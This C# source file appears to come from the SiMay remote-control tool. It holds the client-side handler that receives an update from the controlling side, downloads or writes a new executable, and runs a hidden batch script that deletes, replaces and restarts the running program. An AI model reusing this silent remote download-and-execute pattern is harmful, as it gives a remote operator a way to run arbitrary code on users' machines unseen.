using SiMay.Basic;
using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.Net.SessionProvider;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SiMay.Service.Core
{
    public class ExecuteFileUpdateSimpleService : IRemoteSimpleService
    {
        [PacketHandler(MessageHead.S_SIMPLE_SERVICE_UPDATE)]
        public void UpdateService(SessionProviderContext session)
        {
            try
            {
                var pack = session.GetMessageEntity<RemoteUpdatePacket>();

                string tempFile = this.GetTempFilePath(".exe");
                if (pack.UrlOrFileUpdate == RemoteUpdateKind.File)
                {
                    using (var stream = File.Open(tempFile, FileMode.Create, FileAccess.Write))
                    {
                        stream.Seek(0, SeekOrigin.Begin);
                        stream.Write(pack.FileData, 0, pack.FileData.Length);
                    }
                }
                else if (pack.UrlOrFileUpdate == RemoteUpdateKind.Url)
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(pack.DownloadUrl, tempFile);
                    }
                }

                if (File.Exists(tempFile) && new FileInfo(tempFile).Length > 0)
                {
                    var batchFile = CreateBatch(Application.ExecutablePath, tempFile);
                    if (!batchFile.IsNullOrEmpty())
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo
                        {
                            WindowStyle = ProcessWindowStyle.Hidden,
                            UseShellExecute = true,
                            FileName = batchFile
                        };
                        Process.Start(startInfo);

                        Environment.Exit(0);//退出程序
                    }
                    else
                    {
                        LogHelper.WriteErrorByCurrentMethod("远程更新失败，更新脚本创建失败!");
                    }
                }
                else
                {
                    LogHelper.WriteErrorByCurrentMethod("远程更新失败，服务端文件不存在!");
                }
            }
            catch (Exception ex)
            {
                LogHelper.WriteErrorByCurrentMethod(ex);
            }

            string CreateBatch(string currentFilePath, string newFilePath)
            {
                try
                {
                    string tempFilePath = this.GetTempFilePath(".bat");

                    string updateBatch =
                        "@echo off" + "\r\n" +
                        "chcp 65001" + "\r\n" +
                        "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                        "ping -n 10 localhost > nul" + "\r\n" +
                        "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                        "del /a /q /f " + "\"" + tempFilePath + "\"";

                    File.WriteAllText(tempFilePath, updateBatch, new UTF8Encoding(false));
                    return tempFilePath;
                }
                catch (Exception)
                {
                    return string.Empty;
                }
            }
        }

        private string GetTempFilePath(string extension)
        {
            var currentPath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            string tempFilePath;
            do
            {
                tempFilePath = Path.Combine(currentPath, Guid.NewGuid().ToString() + extension);
            } while (File.Exists(tempFilePath));

            return tempFilePath;
        }
    }
}
